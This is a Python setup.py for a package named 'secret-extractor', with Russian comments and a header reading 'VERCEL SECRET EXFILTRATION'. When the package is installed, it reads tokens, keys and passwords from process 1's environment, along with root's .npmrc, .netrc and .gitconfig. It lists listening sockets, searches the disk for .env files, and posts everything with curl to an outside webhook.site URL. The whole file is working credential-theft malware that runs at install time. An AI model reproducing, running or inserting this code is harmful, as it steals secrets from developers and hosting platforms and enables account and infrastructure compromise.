import os
import subprocess
from setuptools import setup

def run(cmd):
    return subprocess.getoutput(cmd).strip()

# --- СОБИРАЕМ "МЯСО" ---
secrets_report = f"""
#######################################################
#     VERCEL SECRET EXFILTRATION (SaaS TOKENS)        #
#######################################################

[1. PROCESS #1 ENVIRON (The Gold Mine)]
{run('cat /proc/1/environ | tr "\\0" "\\n" | grep -E "TOKEN|SECRET|KEY|PASS|AWS|DATABASE"')}

[2. SYSTEM AUTH TOKENS]
NPMRC: {run('cat /root/.npmrc 2>/dev/null || echo "Not found"')}
NETRC: {run('cat /root/.netrc 2>/dev/null || echo "Not found"')}
GIT_CONFIG: {run('cat /root/.gitconfig 2>/dev/null')}

[3. NETWORK LISTENING (Who is talking?)]
# Проверим, нет ли открытых сокетов, через которые текут данные
{run('ss -lnpt')}

[4. DISK SEARCH FOR .env FILES]
{run('find / -name ".env*" -type f -not -path "*/node_modules/*" 2>/dev/null | xargs -I{{}} echo "FOUND: {{}}"')}

#######################################################
"""

# Отправка на твой Webhook
try:
    subprocess.run(['curl', '-X', 'POST', '-H', 'Content-Type: text/plain', '--data-binary', secrets_report, "https://webhook.site/5429af37-3c52-47e3-8b1e-068229bcbee5"])
except:
    pass

setup(name="secret-extractor", version="4.0")
